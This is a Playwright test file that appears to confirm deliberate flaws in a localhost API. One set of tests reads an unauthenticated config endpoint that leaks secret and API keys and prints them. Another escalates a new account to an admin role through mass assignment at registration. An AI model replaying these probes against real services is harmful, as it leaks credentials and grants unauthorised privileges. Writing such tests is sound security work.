import { test, expect } from '@playwright/test';

const API_URL = 'http://localhost:3000/api';

test.describe('/api/config (Sensitive Data Exposure)', () => {
  test('GET configuration exposes sensitive data', async ({ request }) => {
    const response = await request.get(`${API_URL}/config`);
    expect(response.ok()).toBeTruthy();
    
    const config = await response.json();
    
    expect(config).toHaveProperty('secret_key');
    expect(config).toHaveProperty('api_keys');
    
    console.log('✓ Sensitive configuration exposed:');
    console.log('  Secret Key:', config.secret_key);
    console.log('  Database:', config.database);
    console.log('  API Keys:', config.api_keys);
  });

  test('GET configuration without authentication', async ({ request }) => {
    const response = await request.get(`${API_URL}/config`);
    
    expect(response.ok()).toBeTruthy();
    console.log('✓ Configuration accessible without authentication');
  });
});

test.describe('/api/register (Mass Assignment)', () => {
  test('POST register with admin role escalation', async ({ request }) => {
    const username = `admin_${Date.now()}`;
    
    const response = await request.post(`${API_URL}/register`, {
      data: {
        username: username,
        password: 'password123',
        email: `${username}@test.com`,
        role: 'admin'
      }
    });
    
    const data = await response.json();
    
    expect(data.success).toBeTruthy();
    expect(data.role).toBe('admin');
    
    console.log('✓ Mass assignment successful - Registered as admin');
    console.log(`  User ID: ${data.userId}, Role: ${data.role}`);
  });

  test('POST register with arbitrary role values', async ({ request }) => {
    const roles = ['admin', 'superadmin', 'moderator'];
    
    console.log('Testing mass assignment with different roles:');
    
    for (const role of roles) {
      const username = `user_${role}_${Date.now()}`;
      
      const response = await request.post(`${API_URL}/register`, {
        data: {
          username: username,
          password: 'test',
          email: `${username}@test.com`,
          role: role
        }
      });
      
      const data = await response.json();
      
      if (data.success) {
        console.log(`  ✓ Role "${role}": Success`);
      }
    }
  });
});
